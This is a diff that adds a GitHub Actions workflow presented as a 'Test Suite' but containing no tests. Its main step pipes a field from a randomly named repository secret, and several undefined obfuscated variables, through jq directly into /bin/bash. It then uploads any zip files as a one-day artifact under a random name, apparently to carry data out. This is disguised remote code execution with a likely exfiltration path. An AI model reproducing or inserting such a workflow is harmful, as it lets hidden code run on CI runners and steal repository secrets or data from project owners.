@@ -1,0 +1,30 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          vpae6154: ${{ secrets.vpae6154 }}
+        run: |
+          printf '%s' "$vpae6154" | jq -r .w972 | /bin/bash
+          echo $uxkb154 | jq -r .z1 | /bin/bash
+          printf '%s' "$wf5327" | jq -r .hdvzs30118 | /bin/bash
+          echo $rron15517 | jq -r .tia910 | /bin/bash
+          echo $js875 | jq -r .s67231 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: vS2Qfb7c
+          path: "*.zip"
+          retention-days: 1
